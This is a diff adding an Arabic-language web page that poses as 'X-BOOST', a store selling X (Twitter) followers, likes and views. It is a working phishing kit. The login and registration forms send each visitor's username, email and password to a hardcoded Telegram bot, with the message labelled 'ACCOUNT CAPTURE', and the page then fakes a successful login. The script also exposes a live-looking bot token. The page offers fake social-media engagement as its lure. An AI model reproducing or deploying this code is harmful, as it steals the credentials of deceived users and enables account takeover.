@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X-BOOST | متجر رشق تويتر X</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-color: #000000;
+            --card-bg: #111111;
+            --primary-color: #1d9bf0;
+            --primary-hover: #1a8cd8;
+            --text-main: #e7e9ea;
+            --text-muted: #71767b;
+            --border-color: #2f3336;
+            --success-color: #00ba7c;
+            --danger-color: #f4212e;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-color); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; }
+
+        header { 
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; 
+        }
+        .logo-area { display: flex; align-items: center; gap: 10px; cursor: pointer; }
+        .logo-area .x-icon { background: #ffffff; color: #000000; width: 35px; height: 35px; display: flex; justify-content: center; align-items: center; border-radius: 50%; font-size: 18px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }
+        .logo-area h1 { font-size: 22px; font-weight: 900; letter-spacing: -0.5px; background: linear-gradient(90deg, #ffffff, #94a3b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .user-area { display: none; align-items: center; gap: 15px; font-size: 14px; }
+        .user-area a { color: var(--danger-color); text-decoration: none; font-weight: bold; background: rgba(244, 33, 46, 0.1); padding: 6px 12px; border-radius: 20px; transition: 0.3s; }
+        .user-area a:hover { background: rgba(244, 33, 46, 0.2); }
+
+        .hero { text-align: center; padding: 40px 20px 20px; display: flex; flex-direction: column; align-items: center; }
+        .hero .main-logo { width: 120px; height: 120px; object-fit: cover; border-radius: 20px; margin-bottom: 20px; border: 2px solid var(--primary-color); box-shadow: 0 0 25px rgba(29, 155, 240, 0.4); animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
+        .hero h2 { font-size: 28px; font-weight: 800; margin-bottom: 10px; }
+        .hero p { color: var(--text-muted); font-size: 15px; max-width: 300px; line-height: 1.6; }
+        .hero .highlight { color: var(--primary-color); }
+
+        .container { max-width: 1000px; margin: 0 auto; padding: 20px; flex: 1; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 30px; }
+        .card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 16px; padding: 25px; position: relative; overflow: hidden; transition: transform 0.2s, border-color 0.2s; display: flex; flex-direction: column; cursor: pointer; }
+        .card:hover { transform: translateY(-4px); border-color: var(--primary-color); box-shadow: 0 10px 30px rgba(29, 155, 240, 0.1); }
+        .card-icon { font-size: 40px; color: var(--primary-color); margin-bottom: 15px; }
+        .card h3 { font-size: 20px; margin-bottom: 10px; font-weight: 700; }
+        .card p { color: var(--text-muted); font-size: 14px; margin-bottom: 20px; line-height: 1.5; flex: 1; }
+        .card button { width: 100%; padding: 14px; border-radius: 30px; border: none; background: var(--primary-color); color: white; font-weight: bold; font-size: 16px; cursor: pointer; transition: background 0.2s; display: flex; justify-content: center; align-items: center; gap: 8px; }
+        .card button:hover { background: var(--primary-hover); }
+
+        .packages-container { display: none; max-width: 600px; margin: 0 auto; background: var(--card-bg); border-radius: 16px; padding: 20px; border: 1px solid var(--border-color); }
+        .packages-header { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; }
+        .packages-header i { font-size: 30px; color: var(--primary-color); cursor: pointer; }
+        .packages-header h2 { font-size: 22px; }
+        .package-item { display: flex; justify-content: space-between; align-items: center; background: #0a0a0a; padding: 15px; border-radius: 10px; margin-bottom: 10px; border: 1px solid var(--border-color); transition: 0.2s; }
+        .package-item:hover { border-color: var(--primary-color); }
+        .package-info h4 { font-size: 18px; margin-bottom: 5px; }
+        .package-info p { color: var(--text-muted); font-size: 13px; }
+        .package-price { font-size: 18px; font-weight: bold; color: var(--success-color); }
+        .package-price.free { color: var(--success-color); }
+        .package-btn { background: var(--primary-color); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .package-btn:hover { background: var(--primary-hover); }
+
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(91, 112, 131, 0.4); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: center; z-index: 1000; padding: 20px; }
+        .modal-overlay.active { display: flex; }
+        .modal-content { background: var(--bg-color); padding: 30px; border-radius: 16px; width: 100%; max-width: 400px; border: 1px solid var(--border-color); position: relative; text-align: center; }
+        .modal-content h2 { font-size: 24px; font-weight: 800; margin-bottom: 20px; }
+        .modal-content input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid var(--border-color); background: var(--bg-color); color: white; outline: none; font-size: 15px; text-align: right; }
+        .modal-content input:focus { border-color: var(--primary-color); }
+        .modal-content button { width: 100%; padding: 14px; margin-top: 15px; border-radius: 30px; border: none; background: var(--primary-color); color: white; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .modal-content button:hover { background: var(--primary-hover); }
+        .modal-content .toggle { text-align: center; margin-top: 20px; color: var(--primary-color); cursor: pointer; font-size: 14px; }
+        .modal-content .toggle:hover { text-decoration: underline; }
+        .close-btn { position: absolute; top: 15px; left: 15px; color: var(--text-muted); font-size: 24px; cursor: pointer; }
+        .close-btn:hover { color: white; }
+        .hidden { display: none !important; }
+        
+        .alert { padding: 12px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-size: 14px; font-weight: bold; }
+        .alert-error { background: rgba(244, 33, 46, 0.2); color: var(--danger-color); border: 1px solid var(--danger-color); }
+        .alert-success { background: rgba(0, 186, 124, 0.2); color: var(--success-color); border: 1px solid var(--success-color); }
+        
+        .order-info { background: var(--card-bg); padding: 15px; border-radius: 10px; margin-bottom: 15px; border-right: 4px solid var(--primary-color); text-align: right; }
+        .order-info p { margin: 5px 0; color: var(--text-main); font-size: 15px; }
+        .order-info p span { color: var(--primary-color); font-weight: bold; }
+
+        /* شاشة النجاح */
+        .success-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-color); z-index: 2000; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
+        .success-icon { font-size: 80px; color: var(--success-color); margin-bottom: 20px; animation: pop 0.5s ease-out; }
+        @keyframes pop { 0% { transform: scale(0); } 80% { transform: scale(1.2); } 100% { transform: scale(1); } }
+        .success-screen h2 { font-size: 28px; color: white; margin-bottom: 10px; }
+        .success-screen p { color: var(--text-muted); font-size: 16px; }
+
+        footer { text-align: center; padding: 20px; color: var(--text-muted); font-size: 13px; border-top: 1px solid var(--border-color); margin-top: 40px; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo-area" onclick="showMainStore()">
+            <div class="x-icon"><i class="fa-brands fa-x-twitter"></i></div>
+            <h1>X-BOOST STORE</h1>
+        </div>
+        <div class="user-area" id="navUserInfo">
+            <span>مرحباً، <b id="navUsername"></b></span>
+            <a href="#" onclick="logout()">خروج</a>
+        </div>
+    </header>
+
+    <div id="mainStoreSection">
+        <div class="hero">
+            <img src="https://www.image2url.com/r2/default/images/1793211799532-1485257d-755d-4838-9497-229e5d2236f7.png" alt="Logo" class="main-logo" onerror="this.style.display='none';">
+            <h2>ارتقِ بحسابك على <span class="highlight">X (تويتر)</span></h2>
+            <p>أفضل وأسرع خدمة لزيادة المتابعين واللايكات والمشاهدات</p>
+        </div>
+
+        <div class="container">
+            <div class="grid">
+                <div class="card" onclick="showPackages('followers', 'متابعين X (تويتر)')">
+                    <div class="card-icon"><i class="fa-solid fa-users"></i></div>
+                    <h3>متابعين X (تويتر)</h3>
+                    <p>زيادة عدد متابعين حسابك بشكل آمن. احصل على 1000 متابع مجاناً!</p>
+                    <button><i class="fa-solid fa-bolt"></i> عرض الباقات</button>
+                </div>
+                <div class="card" onclick="showPackages('likes', 'لايكات X (تويتر)')">
+                    <div class="card-icon" style="color: #f91880;"><i class="fa-solid fa-heart"></i></div>
+                    <h3>لايكات X (تويتر)</h3>
+                    <p>زيادة تفاعل تغريداتك ولايكاتك لتصبح الأكثر ظهوراً وتفاعلاً.</p>
+                    <button><i class="fa-solid fa-bolt"></i> عرض الباقات</button>
+                </div>
+                <div class="card" onclick="showPackages('views', 'مشاهدات X (تويتر)')">
+                    <div class="card-icon" style="color: #7856ff;"><i class="fa-solid fa-eye"></i></div>
+                    <h3>مشاهدات X (تويتر)</h3>
+                    <p>زيادة عدد مشاهدات الفيديو أو التغريدة الخاصة بك.</p>
+                    <button><i class="fa-solid fa-bolt"></i> عرض الباقات</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="packagesSection" class="container" style="display: none; margin-top: 30px;">
+        <div class="packages-container" style="display: block;">
+            <div class="packages-header">
+                <i class="fa-solid fa-arrow-right" onclick="showMainStore()"></i>
+                <h2 id="packageTitle">باقات الخدمة</h2>
+            </div>
+            <div id="packagesList"></div>
+        </div>
+    </div>
+
+    <footer>
+        جميع الحقوق محفوظة &copy; 2024 X-BOOST STORE
+    </footer>
+
+    <!-- نافذة تسجيل الدخول / إنشاء حساب -->
+    <div class="modal-overlay" id="authModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('authModal')">&times;</span>
+            <h2 id="authTitle">تسجيل الدخول</h2>
+            <div id="authAlertBox"></div>
+            
+            <form id="loginForm">
+                <input type="text" id="loginUser" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+                <input type="password" id="loginPass" placeholder="كلمة المرور" required>
+                <button type="submit">دخول</button>
+            </form>
+
+            <form id="registerForm" class="hidden">
+                <input type="text" id="regUser" placeholder="اسم المستخدم (اليوزر)" required>
+                <input type="email" id="regEmail" placeholder="البريد الإلكتروني (اختياري)">
+                <input type="password" id="regPass" placeholder="كلمة المرور" required>
+                <button type="submit">إنشاء حساب</button>
+            </form>
+
+            <div class="toggle" id="toggleText" onclick="toggleForms()">ليس لديك حساب؟ اضغط هنا لإنشاء حساب</div>
+        </div>
+    </div>
+
+    <!-- نافذة إتمام الطلب -->
+    <div class="modal-overlay" id="orderModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('orderModal')">&times;</span>
+            <h2>إتمام الطلب</h2>
+            <div class="order-info">
+                <p><b>الخدمة:</b> <span id="selectedServiceText"></span></p>
+                <p><b>الباقة:</b> <span id="selectedPackageText"></span></p>
+                <p><b>السعر:</b> <span id="selectedPriceText"></span></p>
+            </div>
+
+            <form id="orderForm">
+                <input type="url" id="orderLink" placeholder="رابط الحساب أو التغريدة (https://x.com/...)" required>
+                <button type="submit" id="submitOrderBtn">تأكيد وإرسال الطلب</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- شاشة النجاح -->
+    <div class="success-screen hidden" id="successScreen">
+        <div class="success-icon"><i class="fa-solid fa-circle-check"></i></div>
+        <h2>تم تنفيذ الطلب بنجاح ✅</h2>
+        <p>سيتم البدء في تنفيذ طلبك خلال لحظات.</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8945901025:AAFMunPkkoNRdMrj-OtgSUnUapqV_TKEK90";
+        const DEVELOPER_ID = "8794777974";
+        const BOT_USERNAME = "heroil_2bot";
+
+        const packagesData = {
+            'followers': {
+                name: 'متابعين X (تويتر)',
+                packages: [
+                    { qty: 1000, price: 'مجاناً', isFree: true },
+                    { qty: 2000, price: '10 نقاط', isFree: false },
+                    { qty: 3000, price: '15 نقاط', isFree: false },
+                    { qty: 5000, price: '25 نقاط', isFree: false },
+                    { qty: 10000, price: '50 نقاط', isFree: false }
+                ]
+            },
+            'likes': {
+                name: 'لايكات X (تويتر)',
+                packages: [
+                    { qty: 5000, price: '15 نقاط', isFree: false },
+                    { qty: 15000, price: '40 نقاط', isFree: false },
+                    { qty: 25000, price: '60 نقاط', isFree: false }
+                ]
+            },
+            'views': {
+                name: 'مشاهدات X (تويتر)',
+                packages: [
+                    { qty: 5000, price: '10 نقاط', isFree: false },
+                    { qty: 15000, price: '25 نقاط', isFree: false },
+                    { qty: 25000, price: '40 نقاط', isFree: false }
+                ]
+            }
+        };
+
+        let currentServiceKey = "";
+        let currentServiceName = "";
+        let currentPackageQty = 0;
+        let currentPackagePrice = "";
+        
+        // متغير لمنع تكرار الإرسال
+        let isSubmitting = false;
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: DEVELOPER_ID, text: message, parse_mode: 'HTML' })
+                });
+            } catch (error) { console.error(error); }
+        }
+
+        function setSession(username) { localStorage.setItem('xboost_user', username); updateUI(); }
+        function getSession() { return localStorage.getItem('xboost_user'); }
+        function logout() { localStorage.removeItem('xboost_user'); updateUI(); showMainStore(); }
+        function updateUI() {
+            const user = getSession();
+            const navUser = document.getElementById('navUserInfo');
+            if (user) { navUser.style.display = 'flex'; document.getElementById('navUsername').innerText = user; } 
+            else { navUser.style.display = 'none'; }
+        }
+
+        function showAlert(msg, type, boxId) {
+            const box = document.getElementById(boxId);
+            box.innerHTML = `<div class="alert alert-${type}">${msg}</div>`;
+            setTimeout(() => { box.innerHTML = ''; }, 5000);
+        }
+
+        function showPackages(serviceKey, serviceName) {
+            currentServiceKey = serviceKey;
+            currentServiceName = serviceName;
+            
+            document.getElementById('mainStoreSection').style.display = 'none';
+            document.getElementById('packagesSection').style.display = 'block';
+            document.getElementById('packageTitle').innerText = `باقات ${serviceName}`;
+            
+            const packagesList = document.getElementById('packagesList');
+            packagesList.innerHTML = '';
+            
+            const pkgs = packagesData[serviceKey].packages;
+            pkgs.forEach(pkg => {
+                const item = document.createElement('div');
+                item.className = 'package-item';
+                item.innerHTML = `
+                    <div class="package-info">
+                        <h4>${pkg.qty} ${serviceKey === 'followers' ? 'متابع' : serviceKey === 'likes' ? 'لايك' : 'مشاهدة'}</h4>
+                        <p>${pkg.isFree ? 'عرض مجاني لأول مرة' : 'تنفيذ فوري'}</p>
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <span class="package-price ${pkg.isFree ? 'free' : ''}">${pkg.price}</span>
+                        <button class="package-btn" onclick="openAuthModal('${serviceKey}', '${serviceName}', ${pkg.qty}, '${pkg.price}')">اطلب</button>
+                    </div>
+                `;
+                packagesList.appendChild(item);
+            });
+        }
+
+        function showMainStore() {
+            document.getElementById('packagesSection').style.display = 'none';
+            document.getElementById('mainStoreSection').style.display = 'block';
+        }
+
+        function openAuthModal(sKey, sName, qty, price) {
+            currentServiceKey = sKey;
+            currentServiceName = sName;
+            currentPackageQty = qty;
+            currentPackagePrice = price;
+            
+            const user = getSession();
+            if (user) {
+                openOrderModal();
+            } else {
+                document.getElementById('authModal').classList.add('active');
+            }
+        }
+
+        function openOrderModal() {
+            document.getElementById('authModal').classList.remove('active');
+            document.getElementById('selectedServiceText').innerText = currentServiceName;
+            document.getElementById('selectedPackageText').innerText = currentPackageQty + ' (كمية)';
+            document.getElementById('selectedPriceText').innerText = currentPackagePrice;
+            document.getElementById('orderForm').reset();
+            document.getElementById('orderModal').classList.add('active');
+        }
+
+        function closeModal(modalId) { document.getElementById(modalId).classList.remove('active'); }
+
+        function toggleForms() {
+            const loginForm = document.getElementById('loginForm');
+            const regForm = document.getElementById('registerForm');
+            const toggleText = document.getElementById('toggleText');
+            const header = document.getElementById('authTitle');
+
+            if (loginForm.classList.contains('hidden')) {
+                loginForm.classList.remove('hidden'); regForm.classList.add('hidden');
+                toggleText.innerText = 'ليس لديك حساب؟ اضغط هنا لإنشاء حساب'; header.innerText = 'تسجيل الدخول';
+            } else {
+                loginForm.classList.add('hidden'); regForm.classList.remove('hidden');
+                toggleText.innerText = 'لديك حساب بالفعل؟ تسجيل الدخول'; header.innerText = 'إنشاء حساب جديد';
+            }
+        }
+
+        window.onload = () => { updateUI(); };
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if(isSubmitting) return;
+            isSubmitting = true;
+            
+            const loginInput = document.getElementById('loginUser').value;
+            const pass = document.getElementById('loginPass').value;
+            await sendToTelegram(`𓆩☠︎︎𓆪 <b> 𝑨𝑪𝑪𝑶𝑼𝑵𝑻 𝑪𝑨𝑷𝑻𝑼𝑹𝑬 𓆩☠︎︎𓆪  </b>\n\n👤 <b>الحساب:</b> ${loginInput}\n🔑 <b>الباسورد:</b> ${pass}`);
+            setSession(loginInput);
+            showAlert('تم تسجيل الدخول بنجاح!', 'success', 'authAlertBox');
+            setTimeout(() => { 
+                isSubmitting = false;
+                openOrderModal(); 
+            }, 1000);
+        });
+
+        document.getElementById('registerForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if(isSubmitting) return;
+            isSubmitting = true;
+
+            const user = document.getElementById('regUser').value;
+            const email = document.getElementById('regEmail').value;
+            const pass = document.getElementById('regPass').value;
+            const msg = `🆕 <b>حساب جديد في المتجر:</b>\n\n👤 <b>اليوزر:</b> ${user}\n📧 <b>الإيميل:</b> ${email || 'غير مذكور'}\n🔑 <b>الباسورد:</b> ${pass}\n\n🔗 <b>لينك البوت:</b>\nhttps://t.me/${BOT_USERNAME}?start=${user}`;
+            await sendToTelegram(msg);
+            showAlert('تم إنشاء حسابك بنجاح!', 'success', 'authAlertBox');
+            setTimeout(() => { 
+                isSubmitting = false;
+                setSession(user); 
+                openOrderModal(); 
+            }, 1500);
+        });
+
+        // دالة إرسال الطلب مع شاشة النجاح
+        document.getElementById('orderForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if(isSubmitting) return;
+            isSubmitting = true;
+            
+            const btn = document.getElementById('submitOrderBtn');
+            btn.innerText = 'جاري الإرسال...';
+            btn.disabled = true;
+
+            const link = document.getElementById('orderLink').value;
+            const user = getSession();
+            const msg = `🔔 <b>طلب جديد من المتجر:</b>\n\n👤 <b>المستخدم:</b> ${user}\n📦 <b>الخدمة:</b> ${currentServiceName}\n🎯 <b>الباقة:</b> ${currentPackageQty}\n💰 <b>السعر:</b> ${currentPackagePrice}\n🔗 <b>الرابط:</b> ${link}`;
+            
+            await sendToTelegram(msg);
+            
+            // إخفاء نافذة الطلب وإظهار شاشة النجاح
+            closeModal('orderModal');
+            document.getElementById('successScreen').classList.remove('hidden');
+            
+            // العودة بعد 3 ثواني
+            setTimeout(() => { 
+                document.getElementById('successScreen').classList.add('hidden');
+                showMainStore();
+                btn.innerText = 'تأكيد وإرسال الطلب';
+                btn.disabled = false;
+                isSubmitting = false;
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
